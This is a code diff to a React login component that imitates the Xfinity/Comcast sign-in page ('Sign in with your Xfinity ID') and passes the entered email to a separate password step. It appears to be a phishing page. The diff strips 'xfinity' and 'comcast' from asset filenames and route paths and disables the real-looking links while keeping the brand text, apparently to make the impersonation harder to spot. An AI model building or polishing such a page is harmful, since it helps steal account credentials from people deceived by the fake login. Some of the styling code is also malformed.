@@ -1,7 +1,7 @@
 import { useState } from "react";
 import { useNavigate } from "react-router-dom";
-import heroImage from "@/assets/xfinity-banner.png";
-import Logo from "@/assets/xfinity-logo-grey.svg";
+import heroImage from "@/assets/banner.png";
+import Logo from "@/assets/logo-grey.svg";
 import { Link } from "react-router-dom";
 import { ChevronRight } from "lucide-react";
 import Footer from "@/components/Footer/Footer";
@@ -38,7 +38,7 @@ const LoginEmail = () => {
 
     setTimeout(() => {
       setLoading(false);
-      navigate("/comcast/mail/box/hb/comcast/password", { state: { email } });
+      navigate("/box/mail/password", { state: { email } });
     }, 600);
   };
 
@@ -47,26 +47,26 @@ const LoginEmail = () => {
       {/* Split area */}
       <section className="h-[94vh] flex flex-col md:flex-row">
         {/* LEFT */}
-        <div className="flex flex-1 items-center justify-center px-6 py-12 md:px-16">
-          <div className="w-full translate-y-[16px] max-w-xl space-y-6">
+        <div className="flex flex-1 items-center justify-start px-10">
+          <div className="w-full max-w-xl space-y-7">
 
             {/* Logo */}
             <img
               src={Logo}
               alt=""
-              className="translate-y-[6px]"
+              className="]"
               width={70}
             />
 
             {/* Heading */}
-            <div className="space-y-2 translate-y-[20px]">
+            <div className="space-y-3">
               <h1 className="text-3xl font-bold text-foreground leading-tight">
                 Sign in with your Xfinity&nbsp;ID
               </h1>
             </div>
 
             {/* Form */}
-            <form onSubmit={handleSubmit} className="space-y-4 pt-3">
+            <form onSubmit={handleSubmit} className="space-y-6 pt-2">
               <div>
                 <input
                   type="text"
@@ -85,19 +85,19 @@ const LoginEmail = () => {
 
               <p className="text-sm text-neutral-900 leading-relaxed">
                 By signing in, you agree to our{" "}
-                <Link to="#" className="text-xfinity-purple underline">
+                <span  className="text-violet-800 underline">
                   Terms of Service
-                </Link>{" "}
+                </span>{" "}
                 and{" "}
-                <Link to="#" className="text-xfinity-purple underline">
+                <span className="text-violet-800 underline">
                   Privacy Policy
-                </Link>.
+                </span>.
               </p>
 
               <button
                 type="submit"
                 disabled={loading}
-                className="translate-y-[16px] w-28 rounded-sm bg-xfinity-purple py-4 font-semibold text-primary-foreground transition hover:bg-xfinity-purple-hover disabled:opacity-60"
+                className="translate-y-[16px] w-28 rounded-sm bg-violet-800 py-4 font-semibold text-primary-foreground transition hover:bg-purple-text-bg-violet-800-hover disabled:opacity-60"
               >
                 {loading ? "Loading…" : "Let's go"}
               </button>
@@ -106,30 +106,21 @@ const LoginEmail = () => {
             {/* Links */}
             <div className="pt-6 border-neutral-200">
               <div className="flex flex-col text-md gap-1">
-
-                <Link
-                  to="#"
-                  className="flex items-center justify-between w-full px-4 py-3 text-black hover:bg-neutral-100 border-b border-neutral-200"
-                >
-                  <span>New to Xfinity? View exclusive offers near you</span>
-                  <ChevronRight className="text-neutral-500" />
-                </Link>
-
-                <Link
-                  to="#"
-                  className="flex items-center justify-between w-full px-4 py-3 text-black hover:bg-neutral-100 border-b border-neutral-200"
+                <div
+                 
+                  className="flex items-center justify-between w-full px-4 py-3 text-black  border-b border-neutral-500"
                 >
                   <span>Find your Xfinity ID</span>
-                  <ChevronRight className="text-neutral-500" />
-                </Link>
+                  <span>{">"}</span>
+                </div>
 
-                <Link
-                  to="#"
-                  className="flex items-center justify-between w-full px-4 py-3 text-black hover:bg-neutral-100"
+                <div
+                
+                  className="flex items-center justify-between w-full px-4 py-3 text-black "
                 >
                   <span>Create a new Xfinity ID</span>
-                  <ChevronRight className="text-neutral-500" />
-                </Link>
+                  <span>{">"}</span>
+                </div>
 
               </div>
             </div>
@@ -138,16 +129,15 @@ const LoginEmail = () => {
         </div>
 
         {/* RIGHT */}
-        <Link
-          to=""
-          className="hidden md:block md:w-1/2 relative border-l-2 border-transparent active:border-xfinity-purple-hover transition"
+        <div
+          className="hidden md:block md:w-1/2 relative border-l-2 border-transparent active:border-purple-text-bg-violet-800-hover transition"
         >
           <img
             src={heroImage}
             alt=""
-            className="absolute inset-0 h-full w-full object-cover"
+            className="absolute inset-0 h-full w-full object-center"
           />
-        </Link>
+        </div>
       </section>
 
       {/* FOOTER (comes after scroll) */}
